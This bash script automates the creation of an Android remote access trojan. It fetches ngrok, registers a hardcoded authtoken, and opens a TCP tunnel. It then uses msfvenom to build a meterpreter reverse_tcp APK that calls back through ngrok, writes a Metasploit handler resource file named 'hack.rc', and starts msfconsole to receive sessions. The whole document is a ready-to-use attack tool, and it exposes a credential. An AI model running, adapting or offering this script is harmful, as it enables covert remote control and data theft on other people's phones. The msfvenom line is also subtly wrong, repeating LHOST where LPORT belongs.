#!/bin/bash
mkdir RC
mkdir payload
file="ngrok"
if [ -f "$file" ]
then
	echo "$file found."
else
	echo "$file not found."
        echo "downloading $file"
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
./ngrok authtoken 3TKGHN2vCqEzwEoRTNRFp_214CuTzXj7XZjTJVTdtp9
rm ngrok-stable-linux-amd64.zip
fi
if ! gnome-terminal --help > /dev/null; then
   echo -e "Command not found! Installing"
      sudo apt-get install gnome-terminal
fi
echo 'starting services'
service postgresql start
read -p 'choose for ngrok to start : ' lport
gnome-terminal -- ./ngrok tcp $lport
read -p 'port provided by ngrok : ' port
read -p 'payload name you want : ' pname
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LHOST=$port R> payload/$pname.apk
echo '$pname RAT saved in payload folder'
rm RC/hack.rc
touch RC/hack.rc
            echo use exploit/multi/handler > RC/hack.rc
            echo set PAYLOAD android/meterpreter/reverse_tcp >> RC/hack.rc
            echo set LHOST localhost >> RC/hack.rc
            echo set LPORT $lport >> RC/hack.rc
            echo set ExitOnSession false >> RC/hack.rc
            echo exploit -j -z >> RC/hack.rc
            cat RC/hack.rc
            gnome-terminal -- msfconsole -r RC/hack.rc
echo "thanks for using me"

